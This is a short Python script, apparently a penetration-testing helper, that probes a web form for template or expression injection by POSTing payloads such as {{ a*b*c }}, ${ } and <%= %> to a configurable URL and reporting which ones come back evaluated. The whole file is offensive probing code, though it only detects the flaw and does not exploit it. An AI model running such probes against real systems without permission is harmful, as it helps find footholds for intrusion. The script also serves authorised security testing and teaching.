import random

import requests


url = "" # url to post to
data = {"name": None} # post data - set payload bearer to None - {"name": None, "otherstuff": "hard coded stuff"}

def payload_generator():
    prefixes = ["$", "@", "~", "*", "#", ""]
    brackets = ["()", "{}"]
    specials = [["<%=", "%>"], ["{{", "}}"]]
    
    for prefix in prefixes:
        for bracket in brackets:
            yield make_payload(prefix, bracket[0], bracket[1])
    for special in specials:
        yield make_payload("", special[0], special[1])


def make_payload(prefix, open, close):
    a, b, c = random.randint(1,1000), random.randint(1,1000), random.randint(1,1000)
    expression = "*".join((str(a), str(b), str(c)))
    expected = a * b * c
    payload = prefix + open + " " + expression + " " + close
    return payload, str(expected)


def attack(payload, expected, url, data):
    post_data = {}
    for key, value in data.items():
        if not value:
            post_data[key] = payload
        else:
            post_data[key] = value
            
    return expected in requests.post(url, data=post_data).text
        
for payload, expected in payload_generator():
    if attack(payload, expected, url, data):
        print(payload)
